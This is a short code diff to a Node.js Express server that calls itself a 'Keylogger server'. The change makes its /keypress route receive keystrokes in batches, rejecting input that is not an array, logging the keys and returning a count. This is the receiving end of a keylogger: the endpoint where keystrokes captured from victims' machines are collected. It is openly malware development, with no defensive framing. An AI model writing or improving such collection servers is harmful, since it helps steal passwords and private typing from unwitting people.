@@ -11,13 +11,17 @@ app.get('/', (req, res) => {
     res.send("Keylogger server OK");
 });
 
-// Route qui reçoit les touches
+// Route qui reçoit un tableau de touches
 app.post('/keypress', (req, res) => {
-    const { key } = req.body;
+    const { keys } = req.body;
 
-    console.log(`Reçu une pression de touche : ${key}`);
+    if (!keys || !Array.isArray(keys)) {
+        return res.status(400).send({ error: "Format invalide : 'keys' doit être un tableau." });
+    }
 
-    res.status(200).send({ message: 'Touche reçue' });
+    console.log("Touches reçues :", keys);
+
+    res.status(200).send({ message: 'Touches reçues', count: keys.length });
 });
 
 // Lancement du serveur
